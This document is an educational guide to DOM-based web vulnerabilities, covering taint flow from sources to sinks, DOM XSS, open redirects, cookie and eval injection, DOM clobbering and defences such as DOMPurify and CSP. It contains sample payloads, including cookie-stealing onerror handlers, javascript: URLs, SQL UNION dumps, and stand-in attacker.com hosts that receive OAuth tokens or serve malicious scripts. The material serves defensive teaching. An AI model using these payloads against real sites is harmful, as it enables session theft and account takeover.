# DOM-Based Vulnerabilities

DOM-based vulnerabilities represent a distinct and particularly insidious class of web security flaws where the attack payload never necessarily reaches the server — the vulnerability exists entirely within the client-side JavaScript code, which takes data from an attacker-controllable input (a source) and passes it into a dangerous function (a sink) without adequate validation or sanitisation, causing the browser itself to execute the malicious logic in the victim's authenticated session. Unlike reflected or stored XSS where the server returns the malicious payload, DOM-based attacks can exploit JavaScript that runs entirely in the browser, making them invisible to server-side security controls, Web Application Firewalls, and server-side input validation — the server may receive a perfectly safe request and return a perfectly safe response, while the client-side JavaScript running on that response silently executes an attack using data from the URL fragment, referrer header, or local storage. Understanding DOM-based vulnerabilities requires thinking not in terms of HTTP request/response cycles but in terms of data flow through client-side JavaScript: tracing how attacker-controlled values travel from their entry points through the application's JavaScript logic until they reach a function that treats that data as trusted executable or structural content.

The core principle: **a DOM-based vulnerability exists wherever a data path runs from an attacker-controllable source to a dangerous sink through client-side JavaScript without adequate validation — the server is irrelevant to both the attack and its detection**.

## Understanding the DOM

### What the Document Object Model is

**The DOM as a live, scriptable representation of the page:**

```
HTML Document:
<!DOCTYPE html>
<html>
  <head><title>Example</title></head>
  <body>
    <div id="content">
      <p>Hello <span id="name">World</span></p>
    </div>
  </body>
</html>

Browser's DOM tree (hierarchical object representation):
Document
└── html
    ├── head
    │   └── title → "Example"
    └── body
        └── div#content
            └── p
                ├── "Hello "
                └── span#name → "World"

JavaScript can interact with every node:
document.getElementById('name').textContent = 'Alice';
document.querySelector('div').innerHTML = '<b>New content</b>';
document.title = 'New Title';

DOM manipulation is normal and necessary:
- Dynamic content updates (SPAs)
- Form validation feedback
- User interface interactivity
- Data loading and rendering
```

**Why DOM manipulation becomes dangerous:**

```
Safe DOM manipulation:
const name = 'Alice';
document.getElementById('greeting').textContent = name;
// textContent treats value as plain text — never executable
// '<script>alert(1)</script>' would render as visible text, not execute

Unsafe DOM manipulation:
const name = location.search.slice(6);  // Read from URL ?name=...
document.getElementById('greeting').innerHTML = name;
// innerHTML interprets value as HTML — attacker can inject tags!
// URL: ?name=<img src=1 onerror=alert(1)>
// → <img> tag parsed, onerror event fires, alert executes!

The difference:
Which function handles the data at the END of the flow
determines whether the vulnerability exists — not where the data comes from
```

## Taint-Flow: Sources and Sinks

### The taint-flow model

**Conceptual framework for DOM vulnerability analysis:**

```
"Taint" = data that originates from an untrusted/attacker-controlled source
"Taint flows" through the code as variables are assigned, concatenated, passed

Safe code: taint never reaches a dangerous sink
Vulnerable code: taint reaches a dangerous sink without sanitisation

Taint-flow vulnerability:
[Attacker-Controlled Source] → [JavaScript Processing] → [Dangerous Sink]
       URL parameter       →    string concatenation   →   innerHTML

Every DOM-based vulnerability follows this pattern:
Identify what the SOURCE is (where attacker can put data)
Trace how data FLOWS through JavaScript (assignments, functions, arguments)
Identify which SINK ultimately receives the tainted data
Determine if sanitisation/validation breaks the taint chain
```

### Sources — attacker-controllable inputs

**What makes something a source:**

```
A source is ANY JavaScript-accessible value that an attacker
can influence without requiring privileged access

Attacker controllability spectrum:
High control (attacker can set arbitrary values):
→ URL query string (location.search)
→ URL fragment/hash (location.hash)
→ URL path (location.pathname)
→ window.name (persists across navigations!)

Partial control (attacker may influence):
→ document.referrer (by controlling link origin)
→ document.cookie (if subdomain cookie injection possible)
→ Web messages (if postMessage origin not validated)

Contextual control (control depends on application):
→ localStorage / sessionStorage (if stored from prior attack)
→ IndexedDB (if stored from prior attack)
→ Database values returned to client (if stored XSS exists)
```

**Complete source inventory:**

```javascript
// URL-based sources (most common — directly attacker-controllable):
document.URL           // Full URL string
document.documentURI   // Same as document.URL
document.URLUnencoded  // URL without URL-encoding (IE legacy)
document.baseURI       // Base URL of document
location               // Full location object
location.href          // Full URL
location.search        // Query string: "?param=value"
location.hash          // Fragment: "#value"
location.pathname      // Path: "/page/subpage"
location.hostname      // Hostname only
location.protocol      // Scheme: "https:"

// Cookie-based source:
document.cookie        // All cookies as string: "name=value; name2=value2"

// Referrer-based source:
document.referrer      // URL of page that linked here (attacker-controlled link)

// Window name source (persists cross-origin):
window.name
// Attacker page can set: window.name = 'payload';
// Then navigate victim to vulnerable page
// window.name persists! Vulnerable page reads it.

// History API sources:
history.pushState      // State object passed to pushState
history.replaceState   // State object passed to replaceState

// Storage sources (tainted from prior stored attack):
localStorage           // Persistent key-value storage
sessionStorage         // Session-scoped key-value storage
IndexedDB              // Client-side structured database
```

**Why URL fragment is a particularly powerful source:**

```javascript
// URL fragment (hash) is NEVER sent to the server!
// Request for: https://example.com/page#PAYLOAD
// Server receives: GET /page HTTP/1.1 (no fragment!)
// Fragment stays in browser, processed only by JavaScript

// Implication:
// Server-side WAF: never sees the payload
// Server-side logs: never record the payload
// Server-side input validation: never touches the payload
// ONLY client-side JavaScript processes it

// Vulnerable code reading from hash:
const target = location.hash.slice(1);  // Remove '#' character
document.getElementById('content').innerHTML = target;

// Attack URL:
// https://victim.com/page#<img src=1 onerror=alert(document.cookie)>
// Server sees nothing unusual
// Client-side JavaScript writes payload into innerHTML
// XSS executes in victim's browser!
```

### Sinks — dangerous destination functions

**What makes something a sink:**

```
A sink is a function/property that performs a PRIVILEGED or
POTENTIALLY DANGEROUS operation with the value it receives

The danger depends on context:
innerHTML: interprets value as HTML → HTML/script injection
eval(): interprets value as JavaScript → arbitrary code execution
location: interprets value as URL → open redirect / JS injection
document.cookie: sets cookie → session/cookie manipulation
WebSocket(): uses value as URL → WebSocket URL poisoning
```

**Categorised sinks by vulnerability type:**

```javascript
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// DOM XSS SINKS (HTML/Script execution)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
document.write()
document.writeln()
document.body.innerHTML        // any element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
document.body.innerText        // Less dangerous — plain text only in most browsers
// BUT: some attributes on existing elements:
element.setAttribute('href', tainted)     // If href: javascript: URL
element.setAttribute('src', tainted)      // If img/script src: loads from attacker URL
element.setAttribute('action', tainted)   // Form action
element.setAttribute('onclick', tainted)  // Event handler injection

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// OPEN REDIRECTION SINKS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
window.location
window.location.href
window.location.assign()
window.location.replace()
document.location
// If attacker sets: location = 'javascript:alert(1)' → XSS!
// If attacker sets: location = 'https://attacker.com' → phishing redirect

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// JAVASCRIPT INJECTION SINKS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
eval()                         // Executes string as JavaScript
setTimeout('code string')      // String form executes as JS
setInterval('code string')     // String form executes as JS
new Function('code string')    // Creates function from string
// Note: setTimeout(function, delay) is safe — only string arg is dangerous

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// COOKIE MANIPULATION SINKS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
document.cookie                // Setting cookies from tainted data

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// DOCUMENT DOMAIN MANIPULATION
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
document.domain                // SOP relaxation manipulation

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// NETWORK REQUEST SINKS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
new WebSocket(tainted)         // WebSocket URL poisoning
XMLHttpRequest.setRequestHeader() // AJAX header injection
fetch(tainted)                 // Fetch URL poisoning

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// STORAGE SINKS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
localStorage.setItem()
sessionStorage.setItem()

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// PARSING SINKS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
JSON.parse()                   // If parsed value used in dangerous sink
document.evaluate()            // XPath injection
ExecuteSql()                   // Client-side SQL injection
FileReader.readAsText()        // Local file path manipulation

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// DENIAL OF SERVICE SINKS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RegExp()                       // ReDoS with attacker-controlled regex
```

## Vulnerability Classes in Detail

### DOM XSS (most common)

**Tracing a complete taint flow to XSS:**

```javascript
// Vulnerable code — reading from URL and writing to DOM unsafely
function displaySearchTerm() {
    const params = new URLSearchParams(location.search);
    const query = params.get('q');  // SOURCE: location.search

    // SINK: innerHTML interprets HTML tags!
    document.getElementById('results-header').innerHTML =
        'Search results for: ' + query;
}

// Normal usage:
// URL: /search?q=javascript
// Output: <span>Search results for: javascript</span>

// Attack:
// URL: /search?q=<img src=x onerror=alert(document.cookie)>
// Output: <span>Search results for: <img src=x onerror=alert(...)></span>
// → img loads, fails (src=x), onerror fires, alert executes!
// → In real attack: replace alert() with data exfiltration!
```

**Sinks comparison — dangerous vs. safe:**

```javascript
const userInput = location.search.slice(1);  // Tainted value

// ✗ DANGEROUS — interprets as HTML:
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write('<div>' + userInput + '</div>');

// ✓ SAFE — treats as plain text (never interpreted as HTML):
element.textContent = userInput;
element.innerText = userInput;
// Note: textContent is the universally safe alternative to innerHTML

// ✗ DANGEROUS — HTML context via jQuery:
$(element).html(userInput);           // Equivalent to innerHTML
$('#container').append(userInput);    // Parses HTML if string

// ✓ SAFE — jQuery text context:
$(element).text(userInput);           // Safe: textContent equivalent
```

**DOM XSS in HTML attribute context:**

```javascript
// Setting href from attacker-controlled data:
const returnUrl = location.hash.slice(1);  // SOURCE

// ✗ DANGEROUS: javascript: URL protocol!
document.querySelector('a#back').href = returnUrl;
// Attack: #javascript:alert(document.cookie)
// User clicks "Back" link → javascript: executes!

// ✓ SAFE: Validate URL before assigning to href
function isSafeUrl(url) {
    try {
        const parsed = new URL(url, window.location.origin);
        return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
        return false;
    }
}

const returnUrl = location.hash.slice(1);
if (isSafeUrl(returnUrl)) {
    document.querySelector('a#back').href = returnUrl;
} else {
    document.querySelector('a#back').href = '/home';  // Safe fallback
}
```

### DOM-Based Open Redirection

**The classic open redirect taint flow:**

```javascript
// From the PortSwigger description — classic example:
goto = location.hash.slice(1);       // SOURCE: URL fragment
if (goto.startsWith('https:')) {
    location = goto;                 // SINK: window.location assignment
}

// Legitimate use:
// https://innocent-website.com/page#https://innocent-website.com/dashboard
// → Redirects to dashboard after processing

// Attack:
// https://innocent-website.com/page#https://attacker.com/phishing
// → goto = 'https://attacker.com/phishing'
// → goto.startsWith('https:') → TRUE
// → location = 'https://attacker.com/phishing'
// → Victim silently redirected to attacker's phishing page!

// Why startsWith('https:') is insufficient as a check:
// It verifies protocol but NOT domain
// Attacker just needs a URL starting with https:
// https://attacker.com/fake-login looks legitimate to startsWith!
```

**Open redirect enabling chained attacks:**

```javascript
// Open redirect chains into OAuth phishing:
// Scenario: OAuth flow uses redirect_uri from URL

// Vulnerable OAuth redirect handler:
const redirectUri = new URLSearchParams(location.search).get('redirect_uri');
// After OAuth: location.href = redirectUri + '?token=' + accessToken;

// Attack:
// /oauth?redirect_uri=https://attacker.com/steal
// → After authentication: browser redirected to:
// https://attacker.com/steal?token=VICTIM_OAUTH_TOKEN
// → Attacker receives OAuth token in their server logs!

// Open redirect → token theft → account takeover

// Correct fix:
function validateRedirectUri(uri) {
    const allowedUris = [
        'https://app.example.com/dashboard',
        'https://app.example.com/profile',
    ];
    return allowedUris.includes(uri) ? uri : '/dashboard';
}
```

### DOM-Based Cookie Manipulation

**Writing attacker-controlled data into cookies:**

```javascript
// Vulnerable: stores data from URL into cookie
const productId = location.hash.slice(1);    // SOURCE

// SINK: document.cookie assignment
document.cookie = 'lastProduct=' + productId + '; path=/';

// Normal usage:
// URL: /product#item123
// Cookie set: lastProduct=item123

// Attack 1: Cookie value injection
// URL: /product#item123; sessionid=STOLEN_VALUE
// Cookie string becomes: lastProduct=item123; sessionid=STOLEN_VALUE
// → Injected a second cookie! (if server-side cookie parser is naive)

// Attack 2: Session fixation
// URL: /product#legit; session=ATTACKER_KNOWN_VALUE
// → Fixes victim's session to an attacker-known value
// → Attacker logs in with that session → session hijacking!

// Attack 3: Path/domain manipulation
// URL: /product#x; domain=.attacker.com
// Cookie: lastProduct=x; domain=.attacker.com
// → Cookie now sent to attacker.com too!
```

### DOM-Based JavaScript Injection

**eval() and related sinks:**

```javascript
// eval() is the archetypal JavaScript injection sink
// Any attacker-controlled string reaching eval() = arbitrary code execution

// Vulnerable pattern:
const config = location.search.slice(1);     // SOURCE
eval('var settings = ' + config);            // SINK: eval()

// Normal usage:
// URL: ?{"theme":"dark","lang":"en"}
// Evaluates: var settings = {"theme":"dark","lang":"en"}

// Attack:
// URL: ?{"x":1};alert(document.cookie);//
// Evaluates: var settings = {"x":1};alert(document.cookie);//
// → Semi-colon ends the settings statement
// → alert(document.cookie) executes as new statement!

// String-based setTimeout/setInterval (equivalent to eval):
const action = location.hash.slice(1);
setTimeout(action, 1000);         // DANGEROUS: string form!
// Attack: #alert(document.cookie) → executes after 1 second

// Safe alternatives:
setTimeout(() => { performAction(validatedAction); }, 1000);
// Never pass attacker-controlled strings to eval, setTimeout, setInterval
```

### WebSocket URL Poisoning

**Attacker-controlled WebSocket endpoint:**

```javascript
// Vulnerable: WebSocket URL built from attacker-controlled source
const chatRoom = location.search.slice(1);   // SOURCE
// URL: /chat?wss://chat.example.com/room123

const ws = new WebSocket(chatRoom);          // SINK: WebSocket constructor
ws.onmessage = function(event) {
    displayMessage(event.data);
};

// Attack:
// URL: /chat?wss://attacker.com/malicious-ws
// → new WebSocket('wss://attacker.com/malicious-ws')
// → Connection established with attacker's WebSocket server
// → Attacker controls ALL messages received!
// → Can inject malicious HTML into displayMessage()
// → If displayMessage() uses innerHTML: XSS via WebSocket!

// Additional vector: WebSocket handshake includes cookies
// Attacker's WebSocket server receives victim's cookies
// → Session token theft over WebSocket!
```

### Document Domain Manipulation

**Attacker controlling document.domain:**

```javascript
// Vulnerable: setting document.domain from URL
const subdomain = location.search.slice(1);  // SOURCE
document.domain = subdomain;                 // SINK: document.domain

// Context:
// Legitimate use: app.example.com sets document.domain = 'example.com'
// Enables cross-subdomain communication

// Attack if insufficient validation:
// URL: ?attacker.com
// document.domain = 'attacker.com'
// → SOP now allows attacker.com to access this page's DOM
// → If attacker controls attacker.com: full DOM access!
// → Cookie theft, form data theft, anything accessible via JS!

// Modern browsers partially mitigate:
// document.domain must be a suffix of current hostname
// But: if current page is on attacker-controllable subdomain,
// manipulation still possible within legitimate suffix constraints
```

### AJAX Request-Header Manipulation

**Injecting attacker-controlled HTTP headers:**

```javascript
// Vulnerable: request headers built from URL parameters
const customHeader = location.hash.slice(1);  // SOURCE

const xhr = new XMLHttpRequest();
xhr.open('GET', '/api/data');
xhr.setRequestHeader('X-Custom-Header', customHeader);  // SINK
xhr.send();

// Attack: HTTP header injection via CRLF
// URL: #value\r\nX-Injected-Header: malicious
// → Sets: X-Custom-Header: value
//         X-Injected-Header: malicious
// → Injected an arbitrary HTTP header into the request!

// Impact:
// - Bypass security checks relying on specific header values
// - Override expected header values (e.g., X-Forwarded-For)
// - Inject Cache-Control: no-store → affect caching behaviour
// - Host header injection if Host header manipulable

// Also: fetch() with attacker-controlled headers
const headers = {};
headers[location.search.slice(1)] = 'value';
fetch('/api/data', { headers });   // Header name from attacker!
```

### Client-Side SQL Injection

**Web SQL Database (legacy) injection:**

```javascript
// Web SQL Database (deprecated but still in some browsers/apps)
const userId = location.search.slice(1);    // SOURCE

// SINK: ExecuteSql with string concatenation
db.transaction(function(tx) {
    tx.executeSql(
        'SELECT * FROM users WHERE id = ' + userId  // String concatenation!
    );
});

// Normal: ?123 → SELECT * FROM users WHERE id = 123
// Attack: ?1 OR 1=1 → SELECT * FROM users WHERE id = 1 OR 1=1
// → Returns ALL users!

// Attack with UNION:
// ?1 UNION SELECT username, password FROM users--
// → Dumps all usernames and passwords into result set
// → If result rendered into DOM → data disclosed!

// Fix: Use parameterised queries even on client-side
tx.executeSql(
    'SELECT * FROM users WHERE id = ?',
    [userId]    // Parameterised — userId treated as data, not SQL!
);
```

### Client-Side XPath Injection

**XPath query injection via DOM:**

```javascript
// Vulnerable: XPath query built from user input
const searchTerm = location.search.slice(1);  // SOURCE

// SINK: document.evaluate() with string-concatenated XPath
const result = document.evaluate(
    "//user[name/text()='" + searchTerm + "']",  // Concatenated XPath!
    xmlDoc,
    null,
    XPathResult.ANY_TYPE,
    null
);

// Normal: ?alice → //user[name/text()='alice']
// Attack: ?alice' or '1'='1
// Query becomes: //user[name/text()='alice' or '1'='1']
// → Condition always true → returns ALL users!

// Fix: Sanitise single/double quotes from XPath string context
// Or: Use bound variables if XPath engine supports them
```

### DOM-Based Denial of Service

**ReDoS via attacker-controlled regex:**

```javascript
// Vulnerable: regex constructed from attacker-controlled data
const pattern = location.hash.slice(1);  // SOURCE
const regex = new RegExp(pattern);        // SINK: RegExp constructor

// Test regex against content:
const matches = content.match(regex);

// ReDoS attack (Regular Expression Denial of Service):
// Provide a ReDoS-triggering pattern:
// URL: #(a+)+$
// Test against input: 'aaaaaaaaaaaaaaaaaaaaaaab'
// → Catastrophic backtracking!
// → Browser tab freezes/crashes
// → User forced to kill tab or browser

// Also: regex.test() with evil input
const userPattern = location.search.slice(1);
new RegExp(userPattern).test(someString);
// Attacker controls PATTERN (not input):
// Pattern: '^(a+)+$' with input 'aaaaaaaaaaaaaaaaaaaaab' → hangs browser

// Fix:
// Never construct RegExp from untrusted sources
// If regex must be user-controlled: use allowlist of safe characters
// Validate pattern length and complexity before construction
```

## Tracing Taint Flow in Practice

### Manual taint flow analysis methodology

**Step-by-step process for finding DOM vulnerabilities:**

```
Step 1: Identify all sources on the page
→ Open browser developer console
→ Inspect: location.search, location.hash, document.cookie, document.referrer
→ Check: window.name, localStorage, sessionStorage
→ Look for web message listeners: window.addEventListener('message', ...)

Step 2: Search JavaScript for source usage
→ In browser DevTools: Search all JS files for:
   location.search, location.hash, document.referrer, document.cookie
   window.name, localStorage.getItem, sessionStorage.getItem
   URLSearchParams, location.href

Step 3: Trace how source values flow
→ Follow variable assignments
→ Track function parameters
→ Note concatenations, template literals, JSON parsing
→ Identify where the tainted value ultimately lands

Step 4: Check if tainted value reaches a dangerous sink
→ innerHTML, outerHTML, document.write()
→ eval(), setTimeout(string), new Function()
→ location, location.href, location.assign()
→ element.src, element.href, element.action
→ document.cookie, document.domain
→ new WebSocket(), setRequestHeader()

Step 5: Test if sink is reachable with attacker payload
→ Manually inject test values: simple string first
→ Observe DOM changes in Elements panel
→ Verify value appears in sink (before encoding/filtering)
→ Craft exploit payload for that specific context
```

**Using browser DevTools for taint analysis:**

```javascript
// In browser console: monitor DOM writes to detect innerHTML sinks
const originalDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
Object.defineProperty(Element.prototype, 'innerHTML', {
    set: function(value) {
        if (value.includes('<') || value.includes('>')) {
            console.trace('innerHTML called with:', value);
            // Stack trace shows where innerHTML is being set!
        }
        originalDescriptor.set.call(this, value);
    }
});
// Now any innerHTML assignment is logged with stack trace
// Helps find vulnerable code paths during testing

// Monitor eval() calls:
const originalEval = window.eval;
window.eval = function(code) {
    console.trace('eval() called with:', code);
    return originalEval(code);
};

// These monitoring techniques help identify sinks quickly
// during manual testing or with automation tools
```

### Common vulnerable code patterns to search for

```javascript
// PATTERN 1: Direct URL → innerHTML
document.querySelector('#output').innerHTML = location.search;
document.getElementById('msg').innerHTML = decodeURIComponent(location.hash.slice(1));

// PATTERN 2: URL → document.write
document.write('<div>' + location.search + '</div>');

// PATTERN 3: URL → eval (via JSON.parse then property access)
const config = JSON.parse(decodeURIComponent(location.hash.slice(1)));
eval(config.callback + '()');   // config.callback from attacker URL!

// PATTERN 4: URL → location (open redirect)
const redirect = new URLSearchParams(window.location.search).get('next');
window.location.href = redirect;   // No validation!

// PATTERN 5: URL → setAttribute('href')
const link = document.querySelector('#back-link');
link.setAttribute('href', location.hash.slice(1));   // javascript: possible!

// PATTERN 6: Stored data → innerHTML (stored DOM XSS)
const userData = JSON.parse(localStorage.getItem('profile'));
document.getElementById('username').innerHTML = userData.name;
// If userData.name was stored with attacker-controlled content:
// e.g., via a reflected XSS that wrote to localStorage

// PATTERN 7: postMessage → innerHTML (web message DOM XSS)
window.addEventListener('message', function(event) {
    // Missing: origin validation!
    document.getElementById('output').innerHTML = event.data;
});
// Attacker iframe: parent.postMessage('<img src=1 onerror=alert(1)>', '*');
```

## DOM Clobbering

### What DOM clobbering is

**Injecting HTML to manipulate JavaScript behaviour:**

```
DOM clobbering is a technique where:
1. Attacker injects HTML elements (via stored XSS, HTML injection, etc.)
2. Those HTML elements OVERWRITE global JavaScript variables or properties
3. The application uses those variables in dangerous ways
4. Behaviour of application JavaScript is changed to serve attacker's goals

Key insight:
Named HTML elements (id or name attributes) become global variables!

In HTML:
<a id="config">click here</a>

In JavaScript:
console.log(window.config);  // → <a id="config"> element!
// The 'config' variable IS the DOM element, not undefined!

Attacker abuses this to:
→ Replace an expected object with a DOM element
→ DOM element's properties (like href, name) serve attacker's values
→ Application code uses these "clobbered" values as trusted data
```

**Classic DOM clobbering example:**

```html
<!-- Application JavaScript expects: -->
<script>
// Application loads configuration:
let config = window.config || {};
const scriptUrl = config.scriptUrl || '/default.js';
const script = document.createElement('script');
script.src = scriptUrl;   // SINK: script src
document.head.appendChild(script);
</script>

<!-- If window.config is undefined, /default.js loads — safe -->
<!-- If attacker can inject HTML: -->

<!-- Attacker injects via HTML injection vulnerability: -->
<a id="config" href="https://attacker.com/malicious.js">clobbered</a>

<!-- Now in JavaScript: -->
<!-- window.config → <a id="config"> element (DOM element!) -->
<!-- config → <a> element (truthy! overrides || {} fallback) -->
<!-- config.scriptUrl → undefined... BUT: -->

<!-- More sophisticated: nested clobbering -->
<a id="config"><a id="config" name="scriptUrl" href="https://attacker.com/evil.js"></a></a>

<!-- config.scriptUrl → second <a> element (clobbered!) -->
<!-- config.scriptUrl.toString() OR String(config.scriptUrl) → href value! -->
<!-- 'https://attacker.com/evil.js' -->

<!-- Application runs: script.src = 'https://attacker.com/evil.js' -->
<!-- → Attacker's JavaScript loaded and executed! -->
```

**HTML element to property mapping:**

```javascript
// How named HTML elements become JavaScript values:

// Single element with id:
// <input id="username" value="alice">
// window.username → the <input> element

// Accessing "value":
// window.username → <input element>
// window.username.value → 'alice' (actual property)

// For clobbering: attacker uses href/src attribute of anchor tags
// because they return their string value when the element is used as string

// <a id="myVar" href="ATTACKER_VALUE">x</a>
// window.myVar → <a> element
// String(window.myVar) → 'ATTACKER_VALUE' (href value as string!)
// window.myVar + '' → 'ATTACKER_VALUE'
// `${window.myVar}` → 'ATTACKER_VALUE'

// Forms and nested elements for object property clobbering:
// <form id="obj"><input id="prop" value="clobbered"></form>
// window.obj → <form> element
// window.obj.prop → <input> element (named form fields accessible as properties!)
```

**Advanced clobbering techniques:**

```javascript
// Clobbering HTMLCollection for multiple property access:
// <a id="varName">...</a>
// <a id="varName">...</a>
// Two elements with same ID = HTMLCollection
// window.varName → HTMLCollection (array-like object)
// window.varName[0] → first element
// window.varName.namedItem('foo') → ...

// Clobbering document properties:
// <img name="getElementById">
// document.getElementById → clobbered with <img> element
// document.getElementById('target') → TypeError: not a function!
// (Denial of service for page functionality that relies on getElementById)

// Clobbering security-relevant properties:
// <form id="isLoggedIn"><input name="value" value="true"></form>
// Application: if (window.isLoggedIn) { showPrivateContent(); }
// window.isLoggedIn → <form> element (truthy!)
// → showPrivateContent() called even if not logged in!
// (If logic relies on this being falsy when not set)
```

**Preventing DOM clobbering:**

```javascript
// Approach 1: Use const/let instead of var or window properties
const config = getConfig();    // Not window.config → not clobberable!
// (Block-scoped const/let not accessible as window properties)

// Approach 2: Type checking before using potentially clobbered values
const config = window.config;
if (config && typeof config === 'object' && !(config instanceof Element)) {
    // config is a real object, not a clobbered DOM element
    useConfig(config);
}

// Approach 3: Object.freeze for security-critical globals
const securityConfig = Object.freeze({
    allowedHosts: ['app.example.com'],
    maxRetries: 3
});
// Frozen objects cannot be overwritten by HTML injection

// Approach 4: Sanitise injected HTML to remove id/name attributes
// DOMPurify removes dangerous attributes by default:
const clean = DOMPurify.sanitize(untrustedHtml);
// Removes: <a id="config">, <form name="isAdmin">, etc.
// Prevents clobbering via HTML injection
```

## Prevention — Eliminating DOM-Based Vulnerabilities

### Principle 1: Prefer safe sinks over dangerous ones

```javascript
// The golden rule: never use a dangerous sink when a safe alternative exists

// Displaying user-generated text:
// ✗ DANGEROUS:
element.innerHTML = userText;

// ✓ SAFE:
element.textContent = userText;     // Plain text, no HTML interpretation
element.innerText = userText;       // Same (with CSS visibility awareness)

// Building DOM elements:
// ✗ DANGEROUS:
document.body.innerHTML += '<div class="item">' + userText + '</div>';

// ✓ SAFE:
const div = document.createElement('div');
div.classList.add('item');
div.textContent = userText;         // Text safely set as content
document.body.appendChild(div);     // Element added, no HTML parsing of userText

// Setting href attributes:
// ✗ DANGEROUS (javascript: URL possible):
link.href = userUrl;
link.setAttribute('href', userUrl);

// ✓ SAFE (validate first):
function setSafeHref(element, url) {
    try {
        const parsed = new URL(url, window.location.origin);
        if (['http:', 'https:'].includes(parsed.protocol)) {
            element.href = url;
        }
    } catch {
        element.href = '#';  // Default safe fallback
    }
}
```

### Principle 2: Validate and sanitise at every sink

```javascript
// Context-specific sanitisation:

// Context 1: URL values (redirects, href, src)
function validateUrl(url) {
    if (!url) return null;
    try {
        const parsed = new URL(url, window.location.href);
        // Allowlist of safe protocols:
        const safeProtocols = ['http:', 'https:'];
        if (!safeProtocols.includes(parsed.protocol)) return null;
        // Optionally: allowlist of safe domains:
        const safeDomains = ['example.com', 'api.example.com'];
        if (!safeDomains.includes(parsed.hostname)) return null;
        return url;
    } catch {
        return null;
    }
}

// Context 2: HTML content (when innerHTML truly necessary)
// Use DOMPurify library — do not write your own HTML sanitiser!
import DOMPurify from 'dompurify';

function renderUserContent(htmlContent) {
    // DOMPurify removes dangerous tags and attributes
    const sanitised = DOMPurify.sanitize(htmlContent, {
        ALLOWED_TAGS: ['p', 'b', 'i', 'u', 'em', 'strong', 'a'],
        ALLOWED_ATTR: ['href', 'title'],
        // Force all links to be safe:
        FORCE_BODY: true
    });
    element.innerHTML = sanitised;
}

// Context 3: JavaScript values (when eval-like behavior needed)
// Allowlist specific values rather than evaluating arbitrary input
const ALLOWED_CALLBACKS = {
    'onSuccess': () => handleSuccess(),
    'onError': () => handleError(),
    'onComplete': () => handleComplete()
};

const callbackName = new URLSearchParams(location.search).get('callback');
if (callbackName && ALLOWED_CALLBACKS[callbackName]) {
    ALLOWED_CALLBACKS[callbackName]();  // Only calls pre-approved functions
} else {
    handleDefault();
}
// NEVER: eval(callbackName + '()')
```

### Principle 3: Encode data appropriately for context

```javascript
// Different contexts require different encoding:

// HTML context (inserting into HTML body):
function htmlEncode(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}
// OR: use textContent (handles encoding automatically)

// JavaScript string context (inserting into JS string literal):
function jsStringEncode(str) {
    return String(str)
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r')
        .replace(/\0/g, '\\0');
}
// Used if value must appear inside a <script> block as string

// URL parameter context:
const safeParam = encodeURIComponent(userValue);
const url = `/api/search?q=${safeParam}`;

// CSS context (inserting into style attributes):
function cssEncode(str) {
    // Only allow alphanumeric and specific safe characters
    return String(str).replace(/[^a-zA-Z0-9\-_]/g, '');
}

// The right encoding depends on WHERE the value lands:
// HTML body → HTML encoding or textContent
// Inside <script> as string → JS string encoding
// URL parameter → encodeURIComponent
// CSS property value → CSS encoding / allowlisting
// Multiple contexts in sequence = apply BOTH encodings in correct order
```

### Principle 4: Content Security Policy as defence in depth

```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-RANDOM_NONCE_PER_REQUEST';
    object-src 'none';
    base-uri 'self';

Relevant to DOM XSS prevention:
- script-src without 'unsafe-eval': blocks eval(), new Function()
- script-src without 'unsafe-inline': blocks inline event handlers
- script-src with nonce: only scripts with matching nonce execute
- object-src 'none': prevents Flash/plugin-based attacks
- base-uri 'self': prevents base tag injection for relative URL manipulation
```

```javascript
// Nonce-based CSP in Node.js:
const crypto = require('crypto');

app.use((req, res, next) => {
    // Generate fresh nonce per request
    res.locals.nonce = crypto.randomBytes(16).toString('base64');

    res.setHeader('Content-Security-Policy',
        `script-src 'nonce-${res.locals.nonce}' 'strict-dynamic'; ` +
        `object-src 'none'; ` +
        `base-uri 'self'; ` +
        `default-src 'self';`
    );
    next();
});

// In template:
// <script nonce="<%= nonce %>">
//     // Inline script with matching nonce: ALLOWED
//     initApp();
// </script>
//
// Injected script (no nonce): BLOCKED by CSP
// <script>alert(1)</script>  → CSP blocks execution even if injected into DOM
```
